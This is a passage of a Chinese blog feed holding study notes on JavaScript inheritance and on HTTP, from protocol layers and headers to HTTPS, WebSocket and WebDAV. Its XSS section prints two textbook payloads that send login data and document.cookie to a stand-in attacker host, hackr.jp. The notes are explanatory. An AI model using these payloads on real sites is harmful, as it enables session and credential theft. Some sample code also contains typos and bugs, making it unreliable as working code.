class="line">instance1.sayAge();   //29</span><br><span class="line">var instance2 = new SubType(&quot;Greg&quot;,27);</span><br><span class="line">alert(instance2.colors);   //&quot;red,blue,green&quot;</span><br><span class="line">instance2.sayName();   //&quot;Greg&quot;</span><br><span class="line">instance2.sayAge();   //27</span><br></pre></td></tr></table></figure><h3 id="原型式继承"><a href="#原型式继承" class="headerlink" title="原型式继承"></a>原型式继承</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var person = &#123;</span><br><span class="line">    name: &quot;Nicholas&quot;,</span><br><span class="line">    friends: [&quot;Shelby&quot;,&quot;Court&quot;,&quot;Van&quot;]</span><br><span class="line">&#125;;</span><br><span class="line">var anotherPerson  Object(person);</span><br><span class="line">anotherPerson.name = &quot;Greg&quot;;</span><br><span class="line">anotherPerson.friends.push(&quot;Rob&quot;);</span><br><span class="line">var getAnotherPerson = Object(person);</span><br><span class="line">getAnotherPerson.name = &quot;Linda&quot;;</span><br><span class="line">getAnotherPerson.friends.push(&quot;Barbie&quot;);</span><br><span class="line">alert(person.friends);   //&quot;Shelby,Court,Van,Rob,Barbie&quot;</span><br></pre></td></tr></table></figure><p>ES5新增Object.create()方法规范化了原型式继承，在传入一个参数时与Object方法相同</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var person = &#123;</span><br><span class="line">    name: &quot;Nicholas&quot;,</span><br><span class="line">    friends: [&quot;Shelby&quot;,&quot;Court&quot;,&quot;Van&quot;]</span><br><span class="line">&#125;;</span><br><span class="line">var anotherPerson = Object.create(person,&#123;</span><br><span class="line">    name: &#123;</span><br><span class="line">        value: &quot;Greg&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">alert(anotherPerson.name);   //&quot;Greg&quot;</span><br></pre></td></tr></table></figure><h3 id="寄生式继承"><a href="#寄生式继承" class="headerlink" title="寄生式继承"></a>寄生式继承</h3><p>创建一个仅用于封装继承过程的函数，该函数在内部以某种方式来增强对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function createAnother(original)&#123;</span><br><span class="line">    var clone = Object(original);   //创建一个新对象，Object函数不是必需的</span><br><span class="line">    clone.sayHi = function()&#123;</span><br><span class="line">        alert(&quot;Hi&quot;);</span><br><span class="line">    &#125;;</span><br><span class="line">    return clone;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="寄生组合继承"><a href="#寄生组合继承" class="headerlink" title="寄生组合继承"></a>寄生组合继承</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">fucntion inheritP(subType,superType)&#123;</span><br><span class="line">    var prototype = Object(superType.prototype);</span><br><span class="line">    prototype.constructor = subType;</span><br><span class="line">    subType.prototype = prototype;</span><br><span class="line">&#125;</span><br><span class="line">function SuperType(name)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.colors = [&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;];</span><br><span class="line">&#125;</span><br><span class="line">SuperType.prototype.sayName = function()&#123;</span><br><span class="line">    alert(this.name);</span><br><span class="line">&#125;;</span><br><span class="line">function SubType(name,age)&#123;</span><br><span class="line">    SuperType.call(this.name);</span><br><span class="line">    this.age = age;</span><br><span class="line">&#125;</span><br><span class="line">inheritP(SubType,SuperType);</span><br><span class="line">SubType.prototype.sayAge = function()&#123;</span><br><span class="line">    alert(this.age);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;属性类型&quot;&gt;&lt;a href=&quot;#属性类型&quot; class=&quot;headerlink&quot; title=&quot;属性类型&quot;&gt;&lt;/a&gt;属性类型&lt;/h2&gt;&lt;h3 id=&quot;数据属性&quot;&gt;&lt;a href=&quot;#数据属性&quot; class=&quot;headerlink&quot; title=&quot;数据属性&quot;&gt;&lt;/a&gt;数据属性&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&quot;text-align:left&quot;&gt;属性名&lt;/th&gt;
&lt;th style=&quot;text-align:left&quot;&gt;解释&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left&quot;&gt;[[Configurable]]&lt;/td&gt;
&lt;td style=&quot;text-align:left&quot;&gt;表示能否通过delete删除属性从而重新定义属性，默认为true&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left&quot;&gt;[[Enumerable]]&lt;/td&gt;
&lt;td style=&quot;text-align:left&quot;&gt;表示能否通过for-in循环返回属性，默认为true&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left&quot;&gt;[[Writable]]&lt;/td&gt;
&lt;td style=&quot;text-align:left&quot;&gt;表示能否修改属性的值，默认为true&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left&quot;&gt;[[Value]]&lt;/td&gt;
&lt;td style=&quot;text-align:left&quot;&gt;包含这个属性的数值，默认为undefined&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;var person = &amp;#123;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Object.defineProperty(person,&amp;quot;name&amp;quot;,&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    writable: false,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    value: &amp;quot;Nicholas&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;alert(person.name);  // &amp;quot;Nicholas&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;person.name = &amp;quot;Greg&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;alert(person.name);  // &amp;quot;Nicholas&amp;quot;,通过修改属性使之不能被修改&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="前端" scheme="http://dangoying.ink/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="前端" scheme="http://dangoying.ink/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>HTTP原理</title>
    <link href="http://dangoying.ink/HTTP%E5%8E%9F%E7%90%86.html"/>
    <id>http://dangoying.ink/HTTP原理.html</id>
    <published>2019-01-17T14:03:18.000Z</published>
    <updated>2019-01-28T14:59:25.211Z</updated>
    
    <content type="html"><![CDATA[<h2 id="TCP-IP协议族"><a href="#TCP-IP协议族" class="headerlink" title="TCP/IP协议族"></a>TCP/IP协议族</h2><h3 id="重要思想-分层"><a href="#重要思想-分层" class="headerlink" title="重要思想:分层"></a>重要思想:<code>分层</code></h3><h3 id="分层："><a href="#分层：" class="headerlink" title="分层："></a>分层：</h3><ul><li>应用层：<blockquote><p>HTTP协议：生成针对目标web服务器的HTTP请求报文。<br>FTP协议：文件传输协议。<br>DNS协议： 域名解析协议。</p></blockquote></li></ul><a id="more"></a><ul><li>传输层：<blockquote><p>UDP协议：用户数据报协议。<br>TCP协议：传输控制协议：利用三次握手策略。<br><img src="../assets/http/tcp3handmake.gif" alt="Alt text"></p></blockquote></li></ul><ul><li><p>网络层:</p><blockquote><p>IP协议：把各种数据包传送给对方。<br>ARP协议：解析地址协议，通过IP地址查出对应MAC地址。</p></blockquote></li><li><p>链路层：用于处理网络的硬件部分。</p></li></ul><h2 id="URI-URL"><a href="#URI-URL" class="headerlink" title="URI/URL"></a>URI/URL</h2><ul><li>URI：用字符串标识某一互联网资源。</li><li>URL： 互联网上所处的位置表示资源地点。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://user:pass@wwww.example.com:80/dir/index.html?uid=1#ch1</span><br></pre></td></tr></table></figure></li></ul><table><thead><tr><th style="text-align:center">组成</th><th style="text-align:center">解释</th></tr></thead><tbody><tr><td style="text-align:center">https</td><td style="text-align:center">协议方案</td></tr><tr><td style="text-align:center">user:pass</td><td style="text-align:center">登录信息</td></tr><tr><td style="text-align:center">wwww.example.com</td><td style="text-align:center">服务器地址</td></tr><tr><td style="text-align:center">:80</td><td style="text-align:center">端口号</td></tr><tr><td style="text-align:center">dir/index.html</td><td style="text-align:center">文件路径</td></tr><tr><td style="text-align:center">uid=1</td><td style="text-align:center">查询字符串</td></tr><tr><td style="text-align:center">#ch1</td><td style="text-align:center">片段标识符</td></tr></tbody></table><h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><h3 id="请求响应："><a href="#请求响应：" class="headerlink" title="请求响应："></a>请求响应：</h3><ul><li><p>请求报文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST    /from/entry   HTTP/1.1</span><br><span class="line">Host: hacker.jp</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 16</span><br><span class="line">name: ueno&amp;age=37</span><br></pre></td></tr></table></figure></li><li><p>响应报文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1  200  OK</span><br><span class="line">Date: Tue, 10 Jul 2012 06:50:15 GMT</span><br><span class="line">Content-Length: 362</span><br><span class="line">Content-Type: text/html</span><br><span class="line">&lt;html&gt; ......</span><br></pre></td></tr></table></figure></li></ul><h3 id="HTTP可使用方法："><a href="#HTTP可使用方法：" class="headerlink" title="HTTP可使用方法："></a>HTTP可使用方法：</h3><ul><li>GET：获取资源，目的是获取响应的主体内容。</li><li>POST：传输实体主体。</li><li>PUT：传输文件，要求在请求报文中包含文件内容，保存到请求URI指定位置。</li><li>HEAD：获取报文首部，用于确认URI有效性及资源更新的日期时间。</li><li>DELETE：删除文件，删除URI指定资源。</li><li>OPTIONS：询问支持的方法，查询针对请求URI指定资源支持的方法。</li><li>TRACE：追踪路径，用来确认连接过程中发生的一系列操作。</li><li>CONNECT：要求用隧道协议连接代理。</li></ul><h3 id="状态码："><a href="#状态码：" class="headerlink" title="状态码："></a>状态码：</h3><ul><li>状态码类别：</li></ul><table><thead><tr><th style="text-align:center">状态码</th><th style="text-align:center">分类</th><th style="text-align:center">解释</th></tr></thead><tbody><tr><td style="text-align:center">1xx</td><td style="text-align:center">Infromational(信息性状态码)</td><td style="text-align:center">接收的请求正在处理</td></tr><tr><td style="text-align:center">2xx</td><td style="text-align:center">Success(成功状态码)</td><td style="text-align:center">请求正常处理完成</td></tr><tr><td style="text-align:center">3xx</td><td style="text-align:center">Redirectiion(重定向状态码)</td><td style="text-align:center">需要进行附加操作以完成请求</td></tr><tr><td style="text-align:center">4xx</td><td style="text-align:center">Client Error(客户端错误状态码)</td><td style="text-align:center">服务器无法处理请求</td></tr><tr><td style="text-align:center">5xx</td><td style="text-align:center">Server Error(服务器错误状态码)</td><td style="text-align:center">服务器处理请求出错</td></tr></tbody></table><ul><li>常用状态码：</li></ul><table><thead><tr><th style="text-align:left">状态码</th><th style="text-align:left">解释</th></tr></thead><tbody><tr><td style="text-align:left">200 OK</td><td style="text-align:left">从客户端发来的请求在服务端被正常处理了</td></tr><tr><td style="text-align:left">204 No Content</td><td style="text-align:left">服务器接受的请求已成功处理，但返回的响应报文不含实体主体</td></tr><tr><td style="text-align:left">206 Partial Content</td><td style="text-align:left">客户端进行了范围请求</td></tr><tr><td style="text-align:left">301 Moved Permanently</td><td style="text-align:left">永久性重定向</td></tr><tr><td style="text-align:left">302 Found</td><td style="text-align:left">临时性重定向，请求的资源已被分配了新的URI</td></tr><tr><td style="text-align:left">303 See Other</td><td style="text-align:left">与302有着相同功能，但明确要求采用GET获取资源</td></tr><tr><td style="text-align:left">304 Not Modified</td><td style="text-align:left">客户端发送附带条件请求时，服务端允许请求访问，但未满足条件</td></tr><tr><td style="text-align:left">307 Temporary Redirect</td><td style="text-align:left">与302有相同含义，但不会使POST变成GET</td></tr><tr><td style="text-align:left">400 Bad Request</td><td style="text-align:left">请求报文种存在语法错误</td></tr><tr><td style="text-align:left">401 Unauthorized</td><td style="text-align:left">需通过HTTP认证，若已进行过一次请求，则表示认证失败</td></tr><tr><td style="text-align:left">403 Forbidden</td><td style="text-align:left">请求资源的访问被服务器拒绝</td></tr><tr><td style="text-align:left">404 Not Found</td><td style="text-align:left">服务器上无法找到请求的资源</td></tr><tr><td style="text-align:left">500 Internal Server Error</td><td style="text-align:left">服务器端在执行请求时发生了错误</td></tr><tr><td style="text-align:left">503 Service Unavailable</td><td style="text-align:left">服务器暂处于超负载或正在进行停机维护，无法处理请求</td></tr></tbody></table><h3 id="通信数据转发程序："><a href="#通信数据转发程序：" class="headerlink" title="通信数据转发程序："></a>通信数据转发程序：</h3><h4 id="代理："><a href="#代理：" class="headerlink" title="代理："></a>代理：</h4><ul><li>作用：接收由客户端发送的请求并转发给服务器，接收服务器相应转发给客户端，转发时，需要附加Via首部字段以标记出经过的主机信息。</li><li>使用理由：<blockquote><p>利用缓存技术减少网络带宽的流量<br>组织内部针对特定网站的访问控制<br>以获取访问日志为主要目的</p></blockquote></li><li>分类：<blockquote><p>缓存代理：会预先将资源的副本保存在代理服务器<br>透明代理：不对报文做任何加工的代理类型为透明代理</p></blockquote></li></ul><h4 id="网关："><a href="#网关：" class="headerlink" title="网关："></a>网关：</h4><ul><li>作用：工作机制和代理十分相似，而网关能使通信线路上的服务器提供非HTTP协议。</li></ul><h4 id="隧道："><a href="#隧道：" class="headerlink" title="隧道："></a>隧道：</h4><ul><li>作用：建立一条与其他服务器通信的线路，确保客户端能与服务器进行安全的通信。</li></ul><h3 id="HTTP首部字段："><a href="#HTTP首部字段：" class="headerlink" title="HTTP首部字段："></a>HTTP首部字段：</h3><h4 id="类型："><a href="#类型：" class="headerlink" title="类型："></a>类型：</h4><ul><li>通用首部字段：请求报文和响应报文两方都会使用的首部</li><li>请求首部字段：请求报文使用的首部</li><li>响应首部字段：响应报文使用的首部</li><li>实体首部字段：补充了资源内容更新时间等实体有关的信息</li></ul><h4 id="End-to-end首部和Hop-to-hop首部："><a href="#End-to-end首部和Hop-to-hop首部：" class="headerlink" title="End-to-end首部和Hop-to-hop首部："></a>End-to-end首部和Hop-to-hop首部：</h4><ul><li>端到端首部(End-to-end)：分在此类的首部会转发给请求/想一个的最终接受目标。</li><li>逐跳首部(Hop-to-hop)：分在此类的首部支队单词转发有效，会因通过缓存代理不转发。</li></ul><h4 id="通用首部字段："><a href="#通用首部字段：" class="headerlink" title="通用首部字段："></a>通用首部字段：</h4><ul><li>Cache-Control：操作缓存的工作机制</li><li>Connection：控制不再转发给代理的首部字段，管理持久连接</li><li>Date：表明创建HTTP报文的日期和时间</li><li>Pragma：要求所有的中间服务器不返回缓存的资源</li><li>Trailer：事先说明在报文主体后记录了哪些首部字段，可应用于分块传输编码</li><li>Upgrade：用于检测HTTP协议及其协议是否可使用更高的版本进行通信</li><li>Via：追踪客户端与服务器之间的请求和响应报文的传输路径</li><li>Warning:HTTP/1.0：响应首部演变过来，通常会告知用户一些与缓存相关的问题的警告</li></ul><h4 id="请求首部字段："><a href="#请求首部字段：" class="headerlink" title="请求首部字段："></a>请求首部字段：</h4><ul><li>Accept：通知服务器用户代理可处理的媒体类型及媒体类型的相对优先级顺序</li><li>Accept-Charset：通知服务器用户代理支持的字符集及字腹肌的相对优先级顺序</li><li>Accept-Encoding：通知服务器用户代理支持的内容编码及内容编码的相对优先级顺序</li><li>Accept-Language：通知服务器用户代理支持的自然语言集及其相对优先级顺序</li><li>Authorization：通知服务器用户代理的认证信息</li><li>Expect：期望出现某种特定行为，服务器无法理解作出回应时，返回417 Expectation Failed</li><li>From：使用用户代理的用户的电子邮件地址</li><li>Host：请求资源所处的互联网主机名和端口号</li><li>If-Match：匹配资源所用的实体标记值</li><li>If-Modified-Since：请求指定日期后更新过的资源</li><li>If-None-Match：当实体标记(Etag)与请求资源的Etag不一致时，处理请求</li><li>If-range：If-range字段值若是和Etag值的更新日期时间一致，则做范围请求处理</li><li>If-Unmodified-Since：请求在指定日期后未发生更新的资源</li><li>Max-Forwards：指定可经过的服务器最大数目</li><li>Proxy-Authorization：通知服务器认证所需要的信息</li><li>Range：通知服务器资源的指定范围</li><li>Referer：通知服务器请求的原始资源的URI</li><li>TE：通知服务器客户端能够处理响应的传输编码方式及其相对优先级顺序</li><li>User-Agent：将创建请求的浏览器和用户代理名称等信息传输给服务器</li></ul><h4 id="响应首部字段："><a href="#响应首部字段：" class="headerlink" title="响应首部字段："></a>响应首部字段：</h4><ul><li>Accept-Ranges：用来告知客户端服务器是否能处理范围请求</li><li>Age：告知客户端源服务器在多久前创建了响应，单位为妙</li><li>Etag：告知客户端实体标记，可将资源以字符串形式做唯一性标识的方式</li><li>Location：将响应接收方引导至某个与请求URI位置不同的资源</li><li>Proxy-Authenticate：把由代理服务器所要求的的认证信息发送给客户端</li><li>Retry-After：告知客户端在多久之后再次发送请求</li><li>Server：告知客户端当前服务器上安装的HTTP服务器应用程序的信息</li><li>Vary：可对缓存进行控制</li><li>www-Authenticate：告知客户端适用于访问请求URI所指定资源的认证方案</li></ul><h4 id="实体首部字段："><a href="#实体首部字段：" class="headerlink" title="实体首部字段："></a>实体首部字段：</h4><ul><li>Allow：通知客户端能够支持Request-URI制定资源的所有HTTP方法</li><li>Content-Encoding：告知客户端服务器对实体的主体部分选用的内容编码方式</li><li>Content-Language：告知客户端实体主体使用的自然语言</li><li>Content-Length：表明了实体主体部分的大小</li><li>Content-Location：与报文主体部分相对应的URI</li><li>Content-MD5：检查报文主体在传输过程中是否保持完整，以及确认传输到达</li><li>Content-Range：告知客户端作为响应返回的实体的哪个部分符合范围请求</li><li>Content-Type：说明了实体主体内对象的媒体类型</li><li>Expires：将资源失效的日期告知客户端</li><li>Last-Modified：指明资源最终修改的时间</li></ul><h4 id="为Cookie服务的首部字段："><a href="#为Cookie服务的首部字段：" class="headerlink" title="为Cookie服务的首部字段："></a>为Cookie服务的首部字段：</h4><ul><li><p>Set-Cookie：</p><blockquote><p>expires属性：指定浏览器可发送Cookie的有效期<br>path属性：限制指定Cookie的发送范围的文件目录<br>domain属性：作为Cookie适用对象的域名<br>secure属性：仅在HTTPS安全通信时才会发送Cookie<br>HttpOnly属性：加以限制，使Cookie不能被JavaScript脚本访问</p></blockquote></li><li><p>Cookie：当客户想获得HTTP状态管理支持时，就会在请求中包含从服务器接受的Cookie</p></li></ul><h4 id="其他首部字段："><a href="#其他首部字段：" class="headerlink" title="其他首部字段："></a>其他首部字段：</h4><ul><li>X-Frame-Options：用于控制网站内容在其他Web网站的Frame标签内的现实问题，防止点击劫持攻击</li><li>X-XSS-Protection：针对跨站脚本攻击(XSS)的一种对策，用于控制浏览器XSS防护机制的开关</li><li>DNT：意为拒绝个人信息被收集，表示拒绝被精准广告追踪的一种方法</li><li>P3P：利用P3P技术让Web网站上的个人隐私变成一种仅供程序可理解的形式</li></ul><h2 id="HTTP和HTTPS"><a href="#HTTP和HTTPS" class="headerlink" title="HTTP和HTTPS"></a>HTTP和HTTPS</h2><h3 id="HTTP的缺点："><a href="#HTTP的缺点：" class="headerlink" title="HTTP的缺点："></a>HTTP的缺点：</h3><ul><li>通信使用明文(不加密)，内容可能会被窃听</li><li>不验证通信方的身份，因此有可能遭遇伪装</li><li>无法证明报文的完整性，所以有可能已遭篡改</li></ul><h3 id="HTTPS："><a href="#HTTPS：" class="headerlink" title="HTTPS："></a>HTTPS：</h3><h4 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h4><ul><li>HTTPS实在HTTP通信接口部分用SSL和TLS协议代替</li><li>添加了加密及认证机制的HTTP成为HTTPS</li></ul><h4 id="安全通信机制："><a href="#安全通信机制：" class="headerlink" title="安全通信机制："></a>安全通信机制：</h4><p><img src="../assets/http/httpsProcess.jpg" alt="Alt text"></p><h3 id="HTTP认证："><a href="#HTTP认证：" class="headerlink" title="HTTP认证："></a>HTTP认证：</h3><ul><li>Basic认证：采用Base64编码，发送明文密码</li><li>Digest认证：使用质询/响应方式</li><li>SSL客户端认证：借由HTTPS的客户端证书完成认证</li><li>基于表单认证：最常用，并用Cookie来管理Session会话</li></ul><h2 id="基于HTTP的功能追加协议"><a href="#基于HTTP的功能追加协议" class="headerlink" title="基于HTTP的功能追加协议"></a>基于HTTP的功能追加协议</h2><h3 id="SPDY"><a href="#SPDY" class="headerlink" title="SPDY"></a>SPDY</h3><h4 id="HTTP的瓶颈："><a href="#HTTP的瓶颈：" class="headerlink" title="HTTP的瓶颈："></a>HTTP的瓶颈：</h4><ul><li>一条连接上只可发送一个请求</li><li>请求只能从客户端开始，客户端不可以接收响应以外的指令</li><li>请求/响应首部未经压缩就发送，首部信息越多延迟越大</li><li>发送冗长的首部，每次互相发送相同的首部造成的浪费较多</li><li>可任意选择数据压缩格式，非强制压缩发送</li></ul><h4 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h4><ul><li>Ajax：异步请求实现局部刷新，但可能存在大量请求产生</li><li>Comet：一旦服务器内容更新了，可以立即反馈给客户端</li><li>SPDY：<blockquote><p>以会话层的形式加入，控制对数据的流动，但还是采用HTTP建立通信连接<br><code>HTTP</code> 应用层<br><code>SPDY</code> 会话层<br><code>SSL</code> 表示层<br><code>TCP</code> 传输层<br>多路复用流：通过单一的TCP连接，可以无限制处理多个HTTP请求<br>赋予请求优先级：可以给请求逐个分配优先级顺序<br>压缩HTTP首部：压缩HTTP请求和响应的首部<br>推送功能：支持服务器主动向客户端推送数据的功能<br>服务器提示功能：服务器可以主动提示客户端请求所需的资料</p></blockquote></li></ul><h3 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义:"></a>定义:</h4><ul><li>即Web浏览器与Web浏览器服务器之间全双工通信标准</li></ul><h4 id="特点"><a href="#特点" class="headerlink" title="特点:"></a>特点:</h4><ul><li>推送功能：支持由服务器向客户端推送数据的推送功能</li><li>减少通行量：只要建立起WebSocket连接，就希望一直保持连接状态</li></ul><h4 id="WebSocketAPI"><a href="#WebSocketAPI" class="headerlink" title="WebSocketAPI:"></a>WebSocketAPI:</h4><ul><li>JavaScript可调用API，实现WebSocket协议下全双工通信</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var socket = new WebSocket(&apos;ws://game.example.com:12010/updates&apos;);</span><br><span class="line">socket.onopen = function()&#123;</span><br><span class="line">    setInternal(function()&#123;</span><br><span class="line">        if(socket.bufferedAmout == 0)&#123;</span><br><span class="line">            socket.send(getUpdateData());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,50);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="WebDAV"><a href="#WebDAV" class="headerlink" title="WebDAV"></a>WebDAV</h3><h4 id="定义-1"><a href="#定义-1" class="headerlink" title="定义:"></a>定义:</h4><ul><li>WebDAV是一个可对Web服务器上的内容直接进行文件复制、编辑等操作的分布式文件系统</li></ul><h4 id="引入概念"><a href="#引入概念" class="headerlink" title="引入概念:"></a>引入概念:</h4><ul><li>集合(Collection)：是一种统一管理多个资源的概念，以集合为单位可进行各种操作</li><li>资源(Resource)：把文件或集合称为资源</li><li>属性(Property)：定义资源的属性</li><li>锁(Lock)：把文件设置成无法编辑状态</li></ul><h4 id="新增方法及状态码"><a href="#新增方法及状态码" class="headerlink" title="新增方法及状态码:"></a>新增方法及状态码:</h4><ul><li>PROPFIND：获取属性</li><li>PROPPATCH：修改属性</li><li>MKCOL：创建集合</li><li>COPY：复制资源及属性</li><li>MOVE：移动资源</li><li>LOCK：资源加锁</li><li>UNLOCK：资源解锁</li></ul><table><thead><tr><th style="text-align:left">状态码</th><th style="text-align:left">解释</th></tr></thead><tbody><tr><td style="text-align:left">102 Processing</td><td style="text-align:left">可正常处理请求，但目前是处理中状态</td></tr><tr><td style="text-align:left">207 Multi-Status</td><td style="text-align:left">存在多种状态</td></tr><tr><td style="text-align:left">422 Unprocessible Entity</td><td style="text-align:left">格式正确，内容有误</td></tr><tr><td style="text-align:left">423 Locked</td><td style="text-align:left">资源已被加锁</td></tr><tr><td style="text-align:left">424 Failed Dependency</td><td style="text-align:left">处理与某请求关联的请求失败，因此不再维持依赖关系</td></tr><tr><td style="text-align:left">507 Insufficient Storage</td><td style="text-align:left">保存空间不足</td></tr></tbody></table><h2 id="Web的攻击技术"><a href="#Web的攻击技术" class="headerlink" title="Web的攻击技术"></a>Web的攻击技术</h2><h3 id="跨站脚本攻击-XSS"><a href="#跨站脚本攻击-XSS" class="headerlink" title="跨站脚本攻击(XSS)"></a>跨站脚本攻击(XSS)</h3><h4 id="定义-2"><a href="#定义-2" class="headerlink" title="定义:"></a>定义:</h4><ul><li>是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或JavaScript进行的一种攻击</li></ul><h4 id="造成影响"><a href="#造成影响" class="headerlink" title="造成影响:"></a>造成影响:</h4><ul><li>利用虚假输入表单骗取用户个人信息</li><li>利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求</li><li>显示伪造的文章或图片</li></ul><h4 id="攻击案例"><a href="#攻击案例" class="headerlink" title="攻击案例:"></a>攻击案例:</h4><ul><li>获取用户登录信息</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.jp/Login?ID=&quot;&gt;&lt;script&gt;var tf=document.getElemenById(&apos;login&apos;);tf.action=&apos;http://hackr.jp/pwget&apos;;tf.method=&apos;get&apos;;&lt;/script&gt;&lt;span ts=&quot;</span><br></pre></td></tr></table></figure><ul><li>对用户Cookie的窃取攻击</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://example.jp/login?ID=&quot;&gt;&lt;script src=http://hackr.jp/xss.js&gt;&lt;/script&gt;&quot;</span><br><span class="line">xss.js文件：</span><br><span class="line">var content = escape(document.cookie);</span><br><span class="line">document.write(&quot;&lt;img src=http://hackr.jp/?&quot;);</span><br><span class="line">document.write(content);</span><br><span class="line">document.write(&quot;&gt;&quot;);</span><br></pre></td></tr></table></figure><h3 id="SQL攻击"><a href="#SQL攻击" class="headerlink" title="SQL攻击"></a>SQL攻击</h3><h4 id="定义-3"><a href="#定义-3" class="headerlink" title="定义:"></a>定义:</h4><ul><li>指针对Web应用使用的数据库通过运行非法的SQL而产生的攻击</li></ul><h4 id="造成影响-1"><a href="#造成影响-1" class="headerlink" title="造成影响:"></a>造成影响:</h4><ul><li>非法查看或篡改数据库内的数据</li><li>规避认证</li><li>执行和数据库服务器业务关联的程序等</li></ul><h4 id="攻击案例-1"><a href="#攻击案例-1" 